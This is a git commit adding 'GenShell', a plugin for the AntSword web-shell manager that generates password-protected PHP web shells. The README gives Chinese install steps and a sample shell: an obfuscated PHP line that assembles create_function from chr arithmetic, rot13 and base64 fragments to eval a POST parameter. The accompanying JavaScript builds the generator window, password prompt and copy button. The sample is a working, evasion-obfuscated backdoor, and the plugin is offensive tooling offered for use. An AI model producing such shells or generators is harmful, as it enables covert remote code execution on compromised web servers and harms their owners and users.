5592480939444052661aaddbcefb82cb6d850446
Medicean <Medici.Yan@Gmail.com>
2018-08-20 12:35:29 +0800

    support php script

---
+++ README.md
@@ -0,0 +1,39 @@
+# AntSword GenShell
+
+> AntSword 生成 Shell插件
+
+根据用户输入密码或随机产生密码，生成 Shell
+
+## 安装
+
+### 商店安装
+
+进入 AntSword 插件中心，选择 GenShell，点击安装
+
+### 手动安装
+
+1. 获取源代码
+
+	```
+	git clone https://github.com/Medicean/GenShell.git
+	```
+	
+	或者
+	
+	点击 [这里](https://github.com/Medicean/GenShell/archive/master.zip) 下载源代码，并解压。
+
+2. 拷贝源代码至插件目录
+
+    将插件目录拷贝至 `antSword/antData/plugins/` 目录下即安装成功
+
+### 生成 SHell 样例
+
+```
+<?php // 使用时请删除此行, 连接密码: qqzqwUKx ?>
+<?php $BSeT=create_function(chr(072114/01473).chr(0334074/01724).str_rot13('b').str_rot13('z').chr(0x3ac-0x347),chr(28482/282).base64_decode('dg==').base64_decode('YQ==').chr(0xc9a8/0x1de).chr(675-635).str_rot13('$').chr(0x166ed/0x31f).chr(807-696).chr(765-656).base64_decode('ZQ==').chr(0x18a-0x161).base64_decode('Ow=='));$BSeT(base64_decode('NTY0M'.'jA0O0'.'BldkF'.'sKCRf'.''.str_rot13('H').str_rot13('R').base64_decode('OQ==').chr(0x349-0x2f5).base64_decode('Vg==').''.''.chr(0x23e-0x1f8).chr(01633-01447).chr(0117730/0525).str_rot13('p').base64_decode('WA==').''.'pxd1V'.'LeF0p'.'OzE2O'.'TI2MT'.'I7'.''));?>
+```
+
+## 相关链接
+
+* [AntSword 文档](http://doc.uyu.us)
+* [dhtmlx 文档](http://docs.dhtmlx.com/)
---
+++ libs/ui.js
@@ -0,0 +1,158 @@
+/**
+ * UI
+ */
+
+const WIN = require('ui/window');
+const LANG = require('../language/');
+const LANG_T = antSword["language"]['toastr'];
+const clipboard = require('electron').clipboard;
+
+class UI {
+  constructor() {
+    // 创建一个窗口
+    let self = this;
+    self.win = new WIN({
+      title: `${LANG['title']}`,
+      width: 660,
+      height: 450,
+    });
+    self.createMainLayout();
+    // self.win.centerOnScreen();
+    return {
+      onGenerate: (func) => {
+        self.bindToolbarClickHandler(func);
+      },
+      onAbout: () => {}
+    }
+  }
+
+  /**
+   * 创建界面
+   */
+  createMainLayout() {
+    this.createToolbar();
+    this.createEditor();
+  }
+
+  /**
+   * 工具栏
+   */
+  createToolbar() {
+    let self = this;
+    let toolbar = self.win.win.attachToolbar();
+    toolbar.loadStruct([
+      { type: 'buttonSelect', text: LANG['toolbar']['new'], icon: 'plus-circle', id: 'new', openAll: true,
+      options: [
+        { id: 'asp',  icon: 'file-code-o', type: 'button', text: "ASP", enabled: false, }, // 暂不支持  asp aspx
+        { id: 'aspx', icon: 'file-code-o', type: 'button', text: "ASPX", enabled: false, },
+        { id: 'php',  icon: 'file-code-o', type: 'button', text: "PHP"},
+      ]},
+      { id: 'copy', type: 'button', text: LANG['toolbar']['copy'], icon: 'copy' },
+      { id: 'clear', type: 'button', text: LANG['toolbar']['clear'], icon: 'remove' }
+    ]);
+    self.toolbar = toolbar;
+  }
+
+  createEditor(){
+    let self = this;
+    self.editor = null;
+    // 初始化编辑器
+    self.editor = ace.edit(self.win.win.cell.lastChild);
+    self.editor.$blockScrolling = Infinity;
+    self.editor.setTheme('ace/theme/tomorrow');
+    self.editor.session.setMode(`ace/mode/php`);
+    self.editor.session.setUseWrapMode(true);
+    self.editor.session.setWrapLimitRange(null, null);
+
+    self.editor.setOptions({
+      fontSize: '14px',
+      enableBasicAutocompletion: true,
+      enableSnippets: true,
+      enableLiveAutocompletion: true
+    });
+    // 编辑器快捷键
+    self.editor.commands.addCommand({
+      name: 'import',
+      bindKey: {
+        win: 'Ctrl-S',
+        mac: 'Command-S'
+      },
+      exec: () => {
+        self.toolbar.callEvent('onClick', ['import']);
+      }
+    });
+    const inter = setInterval(self.editor.resize.bind(self.editor), 200);
+      self.win.win.attachEvent('onClose', () => {
+        clearInterval(inter);
+        return true;
+    });
+  }
+
+  /**
+  * 监听按钮点击事件
+  * @param  {Function} callback [description]
+  * @return {[type]}            [description]
+  */
+  bindToolbarClickHandler(callback) {
+    let self = this;
+    self.toolbar.attachEvent('onClick', (id) => {
+      switch(id){
+      case "php":
+        layer.prompt({
+          value: "antsword",
+          title: `<i class="fa fa-file-code-o"></i> ${LANG["prompt"]["create_pwd"]}`
+        },(value, i, e) => {
+          layer.close(i);
+          if(value === "antsword"){
+            value = self._randomStr(8);
+          }
+          callback({
+            type: "php",
+            pwd: value,
+          }).then((data) => {
+            if(data){
+              self.editor.session.setMode(`ace/mode/php`);
+              self.editor.session.setValue(`<?php // ${LANG['pwd_hint']}: ${value} ?>\n${data}`);
+              toastr.success(LANG["message"]["gen_success"], LANG_T['success']);
+            }
+          });
+        });
+        break
+      case "asp":
+        break
+      case "aspx":
+        break
+      case "copy":
+        let saveData = self.editor.session.getValue();
+        if(!saveData){
+          toastr.warning(LANG["message"]["edit_null_value"], LANG_T["warning"]);
+          return
+        }
+        clipboard.writeText(saveData);
+        // 检测是否复制成功
+        let txt = clipboard.readText();
+        if (txt) {
+          toastr.success(LANG["message"]["copy_success"], LANG_T['success']);
+        }else{
+          toastr.error(LANG["message"]["copy_fail"], LANG_T['error']);
+        }
+        break
+      case "clear":
+        self.editor.session.setValue("");
+        break
+      }
+    });
+  }
+  _randomStr(len){
+    len = len || 8;
+    let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    let maxPos = chars.length;
+    let pwd = '';
+    for (var i = 0; i < len; i++) {
+      pwd += chars.charAt(Math.floor(Math.random() * maxPos));
+    }
+    return pwd;
+  }
+}
+
+module.exports = UI;
